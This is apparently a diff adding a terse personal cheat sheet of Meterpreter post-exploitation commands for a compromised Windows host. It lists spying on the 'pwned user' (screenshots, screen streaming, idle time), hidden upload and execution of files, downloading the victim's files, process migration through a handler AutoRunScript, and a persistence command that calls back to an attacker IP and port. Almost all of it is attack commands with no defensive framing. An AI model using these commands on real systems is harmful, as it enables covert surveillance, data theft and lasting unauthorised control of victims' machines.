@@ -1,0 +1,35 @@
+getuid -> show pwned user
+getprivs -> show privs
+arp -> show arp table
+netstat && ipconfig
+sysinfo -> show system information
+ps -> process list
+idletime -> how much time user has been idle?
+screenshot && screenshare -> shot takes a PSC, share creates a stream
+
+shell -> get the user's shell <-
+------------------------------------
+upload:
+
+upload /file/location c:\\doublebackslashed\\windows\\location (?)
+execute -H -f c:\\win\\location\\file.exe
+-H Hidden, -f execute.
+
+download:
+
+download c:\\doublebackslashed\\windows\\location /file/location
+
+
+-------------------------------------
+try to migrate process to another:
+
+echo run post/windows/manage/migrate > CommandsOnExecute.rc
+-- in multi/handler, set option -> set AutoRunScript /file/location/CommandsOnExecute.rc
+
+-------------------------------------
+persistence:
+
+run persistence -U -i 5 -p [port] -r [IP]
+-U Auto, -i interval, -r LHOST.
+
+
